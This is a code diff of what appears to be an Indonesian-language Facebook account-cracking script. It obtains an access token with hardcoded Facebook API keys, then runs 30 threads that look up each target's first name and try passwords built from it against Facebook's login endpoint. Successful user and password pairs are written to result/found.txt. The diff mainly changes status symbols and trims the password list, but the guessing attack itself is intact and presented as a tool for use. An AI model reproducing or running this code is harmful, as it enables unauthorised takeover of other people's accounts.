@@ -34,16 +34,16 @@ RE = "\033[0m"
 
 def login():
 	print("%s\n\n* login your account facebook first *\n"%(W))
-	email = input("%s [Us]  %sUser     : "%(P,W))
-	pasw = getpass("%s[Pa]  %sPassword : "%(P,W))
+	email = input("%s [●]  %sUser     : "%(P,W))
+	pasw = getpass("%s[○]  %sPassword : "%(P,W))
 	
 	
 	
 	
-	get(email,pasw)		
+	get(email,pasw)	
 #=================FORM TOKEN
 def     get(email,pasw):
-	print("%s[T]%s membuat kode masuk ..."%(P,W))
+	print("%s[■]%s membuat kode masuk ..."%(P,W))
 	b = open("cookie/token.log","w")
 	try:
 		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pasw+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
@@ -55,23 +55,20 @@ def     get(email,pasw):
 		if "access_token" in ok:
 			b.write(ok["access_token"])
 			b.close()
-			print("%s[O]%s sukses membuat kode masuk..."%(G,W))
-			exit("%s[o]%s kode disimpan di: cookie/token.log"%(G,W))
-      
-      
+			print("%s[☆]%s sukses membuat kode masuk..."%(G,W))
+			exit("%s[☆]%s kode disimpan di: cookie/token.log"%(G,W))
 		elif "www.facebook.com" in ok["error_msg"]:
 			os.system("rm -rf cookie")
-			print("%s[404]%s failed to generate access token !!"%(R,W))
-			exit("%s[303] %syour account checkpoint !!"%(R,W))
+			print("%s[X]%s failed to generate access token !!"%(R,W))
+			exit("%s[X] %syour account checkpoint !!"%(R,W))
 		else:
 			os.system("rm -rf cookie")
-			print("%s[404]%s failed to generate access token !!"%(R,W))
-			exit("%s[303] %swrong email or password !!"%(R,W))		
+			print("%s[X]%s failed to generate access token !!"%(R,W))
+			exit("%s[X] %swrong email or password !!"%(R,W))		
 	except requests.exceptions.ConnectionError:
-		print("%s[404] %sfailed to generate access token"%(R,W))
-		exit("%s[101] %scheck your connection !!"%(R,W))
-    
-   def menu(n,toket):
+		print("%s[X] %sfailed to generate access token"%(R,W))
+		exit("%s[X] %scheck your connection !!"%(R,W))
+def menu(n,toket):
 	global loop
 	loop=0
 	banner()
@@ -130,8 +127,7 @@ def     get(email,pasw):
 	m = ThreadPool(30)
 	m.map(x,target)
 	result(found,checkpoint)
-	exit("%s\n[+] %sDone ... "%(R,W)) 
-  
+	exit("%s\n[+] %sDone ... "%(R,W))
 def x(user):
 	global loop
 	try:
@@ -140,7 +136,7 @@ def x(user):
 		pass
 	try:
 		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"01","@"+nama,nama+"123",nama+"12345",nama+"54321",nama+"321",nama+"86","#"+nama]:
+		for pas in [nama+"01","@"+nama,]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
@@ -200,8 +196,7 @@ def cek():
 		login()
 	except requests.exceptions.ConnectionError:
 		exit("%s[!] %sups no connection !!"%(R,W))
-    
-    def banner():
+def banner():
 	os.system("clear")
 	print("""
 ╭═══════════════════════════╮
